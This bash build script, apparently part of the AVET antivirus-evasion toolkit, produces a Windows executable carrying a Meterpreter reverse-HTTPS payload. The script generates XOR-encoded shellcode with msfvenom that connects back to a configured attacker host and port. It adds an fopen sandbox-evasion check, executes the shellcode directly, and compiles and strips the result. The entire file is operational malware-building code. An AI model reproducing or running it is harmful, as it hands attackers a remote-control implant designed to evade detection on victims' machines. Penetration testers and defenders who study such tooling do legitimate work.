#!/bin/bash
# Executes 64-bit shellcode. Uses metasploit XOR encoding. Performs fopen sandbox evasion.

# include script containing the compiler var $win64_compiler
# you can edit the compiler in build/global_win64.sh
# or enter $win64_compiler="mycompiler" here
. build/global_win64.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST

# make meterpreter reverse payload
msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -f c --platform Windows > input/sc_c.txt

# add fopen sandbox evasion technique
add_evasion fopen_sandbox_evasion

# set shellcode source
set_payload_source static_from_file input/sc_c.txt

# set decoder and key source
set_decoder none
set_key_source none

# set payload info source
set_payload_info_source none

# set shellcode binding technique
set_payload_execution_method exec_shellcode64

# enable debug output
enable_debug_print

# compile
$win64_compiler -o output/output.exe source/avet.c
strip output/output.exe

# cleanup
cleanup_techniques
